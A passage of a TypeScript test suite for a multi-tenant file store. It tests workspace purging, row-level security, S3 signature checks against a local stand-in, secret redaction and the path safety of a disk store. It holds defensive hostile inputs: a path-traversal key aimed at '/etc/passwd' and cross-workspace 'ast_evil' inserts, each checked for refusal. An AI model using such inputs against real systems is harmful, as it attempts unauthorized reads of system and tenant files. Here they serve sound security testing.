    await jobs().drain();
    expect(await memory().list(`${w.workspaceId}/`)).toEqual([]);
    expect(await rows('select 1 from asset where workspace_id = $1', [w.workspaceId])).toEqual([]);
    expect(await memory().list(`${other.workspaceId}/`)).toEqual([`${other.workspaceId}/${kept.assetId}`]);
    expect((await other.get(`/api/v1/assets/${kept.assetId}`)).status).toBe(200);
  });

  it('the purge clears whatever is left under the workspace’s prefix, even a file whose record was lost', async () => {
    const a = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('left behind') });
    await memory().put(`${w.workspaceId}/ast_orphan`, samples.png('no record'), 'image/png');
    const other = await newWorkspace('Untouched');
    const kept = await uploadFile(other, { purpose: 'page-image', type: 'image/png', bytes: samples.png('stays') });
    // Deleted 31 days ago, and the job that should have removed its files never ran.
    await sysPool.query(`update workspace set kill_switch = true, deleted_at = now() - interval '31 days' where id = $1`, [w.workspaceId]);
    expect(await purgeDeletedWorkspaces(sysPool, 30, removeWorkspaceFiles)).toBeGreaterThanOrEqual(1);
    expect(await memory().list(`${w.workspaceId}/`)).toEqual([]);
    expect(await asset(a.assetId)).toBeUndefined();
    expect(await rows('select 1 from workspace where id = $1', [w.workspaceId])).toEqual([]);
    expect(await memory().list(`${other.workspaceId}/`)).toEqual([`${other.workspaceId}/${kept.assetId}`]);
    // If the store can't be reached, the workspace's rows stay, so the next run still knows there is something to remove.
    const stuck = await newWorkspace('Stuck');
    await uploadFile(stuck, { purpose: 'page-image', type: 'image/png', bytes: samples.png('stuck') });
    await sysPool.query(`update workspace set kill_switch = true, deleted_at = now() - interval '31 days' where id = $1`, [stuck.workspaceId]);
    const down = new MemoryStore();
    down.list = async () => {
      throw new BucketError('The file store could not be reached (TimeoutError).');
    };
    setFileStoreForTests(down);
    await expect(purgeDeletedWorkspaces(sysPool, 30, removeWorkspaceFiles)).rejects.toThrow(/could not be reached/);
    expect(await rows('select 1 from workspace where id = $1', [stuck.workspaceId])).toHaveLength(1);
  });

  it('an upload that was announced and never arrived is forgotten after a day', async () => {
    const stale = await announce(w, { purpose: 'page-image', type: 'image/png', size: 100 });
    const fresh = await announce(w, { purpose: 'page-image', type: 'image/png', size: 100 });
    const done = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png() });
    await sysPool.query(`update asset set created_at = now() - interval '2 days' where id = any($1)`, [[stale.body.assetId, done.assetId]]);
    expect(await forgetAbandonedUploads()).toBeGreaterThanOrEqual(1);
    expect(await asset(stale.body.assetId!)).toBeUndefined();
    expect(await asset(fresh.body.assetId!)).toBeDefined();
    expect(await asset(done.assetId)).toBeDefined();
  });
});

describe('row-level security on assets', () => {
  it('the app role sees only its own workspace’s assets, and cannot point a record at another workspace’s file', async () => {
    const other = await newWorkspace('Walled');
    const mine = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('mine') });
    const theirs = await uploadFile(other, { purpose: 'page-image', type: 'image/png', bytes: samples.png('theirs') });
    const c = await appPool().connect();
    try {
      expect((await c.query('select count(*)::int as n from asset')).rows[0].n).toBe(0);
    } finally {
      c.release();
    }
    await withWorkspace({ workspaceId: w.workspaceId }, async (tx) => {
      expect((await tx.query('select id from asset')).rows.map((r) => r.id)).toEqual([mine.assetId]);
      expect((await tx.query('select 1 from asset where id = $1', [theirs.assetId])).rowCount).toBe(0);
      expect((await tx.query('update asset set name = $2 where id = $1', [theirs.assetId, 'x'])).rowCount).toBe(0);
    });
    await expect(withWorkspace({ workspaceId: w.workspaceId }, (tx) => tx.query(`insert into asset (id, workspace_id, purpose, content_type, size_bytes, storage_key, created_by) values ('ast_evil', $1, 'page-image', 'image/png', 1, $1 || '/ast_evil', 'x')`, [other.workspaceId]))).rejects.toThrow(/row-level security/);
    // A record whose key points into another workspace's part of the store is refused by the table itself.
    await expect(withWorkspace({ workspaceId: w.workspaceId }, (tx) => tx.query(`insert into asset (id, workspace_id, purpose, content_type, size_bytes, storage_key, created_by) values ('ast_evil', $1, 'page-image', 'image/png', 1, $2, 'x')`, [w.workspaceId, `${other.workspaceId}/${theirs.assetId}`]))).rejects.toThrow(/check constraint|duplicate key/);
  });
});

/* ───────────── The bucket ───────────── */

/**
 * A stand-in for the bucket: a small web server on this machine that speaks enough of the S3 protocol to keep,
 * return, list and remove objects. It checks every request's signature the way S3 does, and writes down every
 * request line and header it receives, so a test can look for the secret in them.
 */
interface StandIn {
  server: Server;
  endpoint: string;
  objects: Map<string, { bytes: Buffer; type: string }>;
  seen: string[];
  failWith: number | null;
}
const SECRET = ['bucket', 'secret', 'k9Zq7Lw2Xv5Tn8Rb3Hd6Yc1Mf4Pg0Js'].join('-');
const KEY_ID = 'tid_standInAccessKey';

async function standInBucket(): Promise<StandIn> {
  const s: StandIn = { server: null as unknown as Server, endpoint: '', objects: new Map(), seen: [], failWith: null };
  const body = (req: IncomingMessage) =>
    new Promise<Buffer>((resolve) => {
      const parts: Buffer[] = [];
      req.on('data', (d: Buffer) => parts.push(d));
      req.on('end', () => resolve(Buffer.concat(parts)));
    });
  s.server = createServer(async (req, res) => {
    const bytes = await body(req);
    s.seen.push(`${req.method} ${req.url} ${JSON.stringify(req.headers)}`);
    const url = new URL(req.url!, `http://${req.headers.host}`);
    const fail = (status: number, code: string) => {
      res.writeHead(status, { 'content-type': 'application/xml' });
      res.end(`<?xml version="1.0"?><Error><Code>${code}</Code><Message>no</Message><AWSAccessKeyId>${KEY_ID}</AWSAccessKeyId></Error>`);
    };
    if (s.failWith) return fail(s.failWith, 'InternalError');
    // The signature is worked out again from the request as it arrived, and must be the one that was sent.
    const amzDate = String(req.headers['x-amz-date']);
    const at = new Date(amzDate.replace(/^(\d{4})(\d{2})(\d{2})T(\d{2})(\d{2})(\d{2})Z$/, '$1-$2-$3T$4:$5:$6Z'));
    const payloadHash = createHash('sha256').update(bytes).digest('hex');
    if (req.headers['x-amz-content-sha256'] !== payloadHash) return fail(400, 'XAmzContentSHA256Mismatch');
    const expected = authorization({ method: req.method!, host: String(req.headers.host), path: decodeURIComponent(url.pathname), query: Object.fromEntries(url.searchParams), headers: { 'x-amz-content-sha256': payloadHash, 'x-amz-date': amzDate }, payloadHash, region: 'auto', accessKeyId: KEY_ID, secretAccessKey: SECRET, at });
    if (req.headers.authorization !== expected) return fail(403, 'SignatureDoesNotMatch');
    const [, bucket, ...rest] = decodeURIComponent(url.pathname).split('/');
    if (bucket !== 'timmy-files') return fail(404, 'NoSuchBucket');
    const key = rest.join('/');
    if (req.method === 'PUT') {
      s.objects.set(key, { bytes, type: String(req.headers['content-type']) });
      return void res.writeHead(200).end();
    }
    if (req.method === 'DELETE') {
      s.objects.delete(key);
      return void res.writeHead(204).end();
    }
    if (req.method === 'GET' && !key) {
      const all = [...s.objects.keys()].filter((k) => k.startsWith(url.searchParams.get('prefix') ?? '')).sort();
      // Two at a time, so a listing longer than a page is exercised.
      const from = Number(url.searchParams.get('continuation-token') ?? 0);
      const page = all.slice(from, from + 2);
      const more = from + 2 < all.length;
      res.writeHead(200, { 'content-type': 'application/xml' });
      return void res.end(`<?xml version="1.0"?><ListBucketResult><IsTruncated>${more}</IsTruncated>${page.map((k) => `<Contents><Key>${k}</Key></Contents>`).join('')}${more ? `<NextContinuationToken>${from + 2}</NextContinuationToken>` : ''}</ListBucketResult>`);
    }
    const o = s.objects.get(key);
    if (!o) return fail(404, 'NoSuchKey');
    res.writeHead(200, { 'content-type': o.type });
    res.end(o.bytes);
  });
  await new Promise<void>((resolve) => s.server.listen(0, '127.0.0.1', resolve));
  s.endpoint = `http://127.0.0.1:${(s.server.address() as { port: number }).port}`;
  return s;
}

describe('the bucket', () => {
  let s3: StandIn;
  const store = (over: Partial<ConstructorParameters<typeof BucketStore>[0]> = {}) => new BucketStore({ endpoint: s3.endpoint, name: 'timmy-files', region: 'auto', accessKeyId: KEY_ID, secretAccessKey: SECRET, urlStyle: 'path', ...over }, 3000);
  beforeAll(async () => {
    s3 = await standInBucket();
  });
  afterAll(() => {
    s3.server.close();
    setFileStoreForTests(null);
  });
  beforeEach(() => {
    s3.objects.clear();
    s3.seen = [];
    s3.failWith = null;
  });

  it('signs requests the way Amazon’s own published examples do', () => {
    // From "Signature Calculations for the Authorization Header" in the Amazon S3 API reference.
    const empty = createHash('sha256').update('').digest('hex');
    const base = { host: 'examplebucket.s3.amazonaws.com', region: 'us-east-1', accessKeyId: 'AKIAIOSFODNN7EXAMPLE', secretAccessKey: ['wJalrXUtnFEMI', 'K7MDENG', 'bPxRfiCYEXAMPLEKEY'].join('/'), at: new Date('2013-05-24T00:00:00Z') };
    const signature = (r: Omit<Parameters<typeof authorization>[0], keyof typeof base>) => authorization({ ...base, ...r }).split('Signature=')[1];
    expect(signature({ method: 'GET', path: '/test.txt', headers: { range: 'bytes=0-9', 'x-amz-content-sha256': empty, 'x-amz-date': '20130524T000000Z' }, payloadHash: empty })).toBe('f0e8bdb87c964420e857bd35b5d6ed310bd44f0170aba48dd91039c6036bdb41');
    const hash = createHash('sha256').update('Welcome to Amazon S3.').digest('hex');
    expect(signature({ method: 'PUT', path: '/test$file.text', headers: { date: 'Fri, 24 May 2013 00:00:00 GMT', 'x-amz-content-sha256': hash, 'x-amz-date': '20130524T000000Z', 'x-amz-storage-class': 'REDUCED_REDUNDANCY' }, payloadHash: hash })).toBe('98ad721746da40c64f1a55b78f14c238d841ea1380cd77a1b5971af0ece108bd');
    expect(signature({ method: 'GET', path: '/', query: { lifecycle: '' }, headers: { 'x-amz-content-sha256': empty, 'x-amz-date': '20130524T000000Z' }, payloadHash: empty })).toBe('fea454ca298b7da1c68078a5d1bdbfbbe0d65c699e0f91ac7a200a0136783543');
    expect(signature({ method: 'GET', path: '/', query: { 'max-keys': '2', prefix: 'J' }, headers: { 'x-amz-content-sha256': empty, 'x-amz-date': '20130524T000000Z' }, payloadHash: empty })).toBe('34b48302e7b5fa45bde8084f4b7868a86f0a534bc59db6670ed5711ef69dc6f7');
  });

  it('keeps, returns, lists and removes files, with every request signed', async () => {
    const b = store();
    const bytes = samples.png('in the bucket');
    await b.put('ws_1/ast_a', bytes, 'image/png');
    await b.put('ws_1/ast_b', samples.pdf(), 'application/pdf');
    await b.put('ws_1/ast_c', samples.jpeg(), 'image/jpeg');
    await b.put('ws_2/ast_z', samples.png('other'), 'image/png');
    expect(s3.objects.get('ws_1/ast_a')).toMatchObject({ type: 'image/png' });
    expect(sha256((await b.get('ws_1/ast_a'))!)).toBe(sha256(bytes));
    expect(await b.get('ws_1/ast_missing')).toBeNull();
    // A listing longer than one page is followed to its end, and stays inside the prefix asked for.
    expect((await b.list('ws_1/')).sort()).toEqual(['ws_1/ast_a', 'ws_1/ast_b', 'ws_1/ast_c']);
    expect(await b.list('ws_3/')).toEqual([]);
    await b.remove('ws_1/ast_a');
    await b.remove('ws_1/ast_a');
    expect(await b.get('ws_1/ast_a')).toBeNull();
    // The stand-in checked each signature; one made with the wrong key is refused.
    await expect(store({ secretAccessKey: 'not-the-key' }).put('ws_1/x', bytes, 'image/png')).rejects.toThrow(/answered 403 \(SignatureDoesNotMatch\)/);
    expect(s3.objects.has('ws_1/x')).toBe(false);
    // Railway's buckets take the bucket's name in the host; the address is built that way unless told otherwise.
    const virtual = new BucketStore({ endpoint: 'https://t3.storageapi.dev', name: 'timmy-files', region: 'auto', accessKeyId: KEY_ID, secretAccessKey: SECRET, urlStyle: 'virtual' });
    expect(virtual.kind).toBe('bucket');
    expect(() => new BucketStore({ endpoint: 'http://storage.example', name: 'b', region: 'auto', accessKeyId: 'a', secretAccessKey: 's', urlStyle: 'virtual' })).toThrow(/https/);
  });

  it('the bucket’s secret is never in a request, an error, a log line or an answer from the API', async () => {
    setFileStoreForTests(store());
    const up = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png('through the api') });
    expect(up.status).toBe(200);
    expect(s3.objects.has(`${w.workspaceId}/${up.assetId}`)).toBe(true);
    const got = await w.get(`/api/v1/assets/${up.assetId}`);
    expect(got.status).toBe(200);
    const answers: string[] = [JSON.stringify(Object.fromEntries(got.headers))];

    // The store breaks in every way it can: it refuses, it answers nonsense, it is not there at all.
    const errors: string[] = [];
    const attempt = async (what: string) => {
      const put = await uploadFile(w, { purpose: 'page-image', type: 'image/png', bytes: samples.png(what) });
      expect([what, put.status]).toEqual([what, 502]);
      expect((await asset(put.assetId))!.uploaded_at).toBeNull();
      const read = await w.get(`/api/v1/assets/${up.assetId}`);
      expect([what, read.status]).toEqual([what, 502]);
      answers.push(JSON.stringify(put), await read.text(), JSON.stringify(Object.fromEntries(read.headers)));
      for (const op of [() => fileStore().get('ws/a'), () => fileStore().list('ws/'), () => fileStore().remove('ws/a'), () => fileStore().put('ws/a', samples.png(), 'image/png')]) errors.push(await op().then(() => '', (e: Error) => `${e.name} ${e.message} ${e.stack} ${JSON.stringify(e)}`));
    };
    s3.failWith = 500;
    await attempt('the store answers 500');
    s3.failWith = 403;
    await attempt('the store refuses');
    s3.failWith = null;
    setFileStoreForTests(store({ secretAccessKey: `${SECRET}-rotated` }));
    await attempt('the key is wrong');
    setFileStoreForTests(store({ endpoint: 'http://127.0.0.1:9' }));
    await attempt('nothing is listening');
    expect(errors.filter(Boolean).length).toBeGreaterThanOrEqual(12);

    const everything = [...s3.seen, ...errors, ...answers, ...recent].join('\n');
    expect(everything).toContain('The file store');
    expect(everything).not.toContain(SECRET);
    expect(everything).not.toContain(encodeURIComponent(SECRET));
    expect(everything).not.toContain(Buffer.from(SECRET).toString('base64'));
    // The requests were signed, so the secret was used; it was just never sent.
    expect(s3.seen.every((line) => /AWS4-HMAC-SHA256 Credential=tid_standInAccessKey/.test(line))).toBe(true);
    // And a key the server was configured with is masked wherever it might be written.
    const { redact } = await import('../src/lib/log');
    const before = config.bucket.secretAccessKey;
    try {
      config.bucket.secretAccessKey = SECRET;
      expect(redact(`key=${SECRET}`)).toBe('key=[redacted]');
    } finally {
      config.bucket.secretAccessKey = before;
    }
  });

  it('which store is used: the bucket when the server was given one, the stand-in only where stand-ins belong, and never a quiet fallback', () => {
    const kept = { ...config.bucket, store: config.files.store, fake: config.fakeProviders, stage: config.stage };
    const set = (over: { stage?: typeof config.stage; fake?: boolean; store?: 'bucket' | 'standin'; bucket?: boolean }) => {
      config.stage = over.stage ?? 'production';
      config.fakeProviders = over.fake ?? false;
      config.files.store = over.store;
      Object.assign(config.bucket, over.bucket ? { endpoint: 'https://t3.storageapi.dev', name: 'b', accessKeyId: 'a', secretAccessKey: 's' } : { endpoint: '', name: '', accessKeyId: '', secretAccessKey: '' });
      return storeKind();
    };
    try {
      // Given a bucket, a server uses it: production, and staging even while its providers are stand-ins.
      expect(set({ bucket: true })).toBe('bucket');
      expect(set({ stage: 'staging', fake: true, bucket: true })).toBe('bucket');
      expect(set({ stage: 'staging', fake: true, bucket: true, store: 'standin' })).toBe('standin');
      // Without one: the stand-in for tests, a developer's machine, and wherever the stand-in providers run.
      expect(set({ stage: 'test' })).toBe('standin');
      expect(set({ stage: 'development' })).toBe('standin');
      expect(set({ stage: 'staging', fake: true })).toBe('standin');
      // A deployed server with no bucket has no store. It does not fall back to keeping files in memory.
      expect(set({ stage: 'production' })).toBeNull();
      expect(set({ stage: 'staging' })).toBeNull();
      expect(set({ stage: 'development', store: 'bucket' })).toBeNull();
      // One of the settings missing is the same as none.
      set({ stage: 'production' });
      Object.assign(config.bucket, { endpoint: 'https://t3.storageapi.dev', name: 'b', accessKeyId: 'a', secretAccessKey: '' });
      expect(storeKind()).toBeNull();
    } finally {
      Object.assign(config.bucket, { endpoint: kept.endpoint, name: kept.name, accessKeyId: kept.accessKeyId, secretAccessKey: kept.secretAccessKey });
      config.files.store = kept.store;
      config.fakeProviders = kept.fake;
      config.stage = kept.stage;
    }
  });

  it('with no store at all, uploads say so and nothing is kept in passing', async () => {
    const kept = { store: config.files.store };
    try {
      // "Use the bucket", on a server that has none.
      config.files.store = 'bucket';
      setFileStoreForTests(null);
      const out = await announce(w, { purpose: 'page-image', type: 'image/png', size: 100 });
      expect(out.status).toBe(503);
      expect(out.body.error).toMatch(/aren’t set up/);
      expect((await w.get('/api/v1/assets/ast_anything')).status).toBe(404);
    } finally {
      config.files.store = kept.store;
    }
  });
});

describe('the stand-in on disk', () => {
  it('keeps files in a folder, by workspace, and takes nothing that is not a storage key', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'timmy-files-'));
    try {
      const f = new FolderStore(dir);
      await f.put('ws_1/ast_a', samples.png('on disk'), 'image/png');
      await f.put('ws_1/ast_b', samples.pdf(), 'application/pdf');
      await f.put('ws_2/ast_c', samples.png(), 'image/png');
      expect(sha256((await f.get('ws_1/ast_a'))!)).toBe(sha256(samples.png('on disk')));
      expect((await f.list('ws_1/')).sort()).toEqual(['ws_1/ast_a', 'ws_1/ast_b']);
      expect(await f.list('../')).toEqual([]);
      await f.remove('ws_1/ast_a');
      expect(await f.get('ws_1/ast_a')).toBeNull();
      await expect(f.put('../outside', samples.png(), 'image/png')).rejects.toThrow(/not a storage key/);
      await expect(f.get('ws_1/../../etc/passwd')).rejects.toThrow(/not a storage key/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
